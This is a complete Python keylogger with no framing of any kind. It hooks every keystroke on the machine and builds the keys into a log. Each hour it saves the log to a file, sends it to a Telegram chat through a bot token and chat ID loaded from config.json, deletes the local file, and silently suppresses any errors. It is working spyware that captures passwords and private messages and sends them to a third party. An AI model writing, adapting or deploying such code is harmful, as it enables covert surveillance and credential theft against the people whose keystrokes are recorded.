import keyboard
from threading import Timer
from datetime import datetime as dt
from os import abort, remove
import telebot
import json

with open('config.json') as f:
    data = json.load(f)

TOKEN = data['token']
CHAT_ID = data['chat_id']
EXIT_HOTKEY = data['exit_hotkey']


def time_now() -> str:
    return f'{dt.today():%d_%m_%Y_%H-%M-%S}'


class Keylogger:

    def __init__(self, interval=3600):
        self.interval = interval
        self.log = ''
        self.start_dt = time_now()
        self.end_dt = time_now()
        self.filename = f'keylog-{self.start_dt}_{self.end_dt}.txt'

    def start(self):
        self.start_dt = time_now()
        keyboard.hook(callback=self.callback)
        keyboard.add_hotkey(EXIT_HOTKEY, callback=self.save_and_exit)
        self.report()
        keyboard.wait()

    def callback(self, event):
        name = event.name
        if event.event_type == 'down':
            if len(name) == 1:
                self.log += name
        else:
            if len(name) > 1:
                if name == 'space':
                    name = ' '
                elif name == 'enter':
                    name = '[ENTER]\n'
                else:
                    name = name.replace(' ', '_')
                    name = f'[{name.upper()}]'
                self.log += name

    def save_and_exit(self):
        self.report()
        abort()

    def report(self):
        if self.log:
            self.end_dt = time_now()
            self.filename = f'keylog-{self.start_dt}_{self.end_dt[11:]}.txt'
            self.start_dt = time_now()

            self.save_and_send()

        self.log = ''

        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def save_and_send(self):
        # noinspection PyBroadException
        try:
            bot = telebot.TeleBot(TOKEN)

            with open(self.filename, 'w') as file:
                print(self.log, file=file)

            with open(self.filename, 'rb') as document:
                bot.send_document(CHAT_ID, document)

            remove(self.filename)

        except Exception:
            pass


if __name__ == '__main__':
    keylogger = Keylogger()
    keylogger.start()
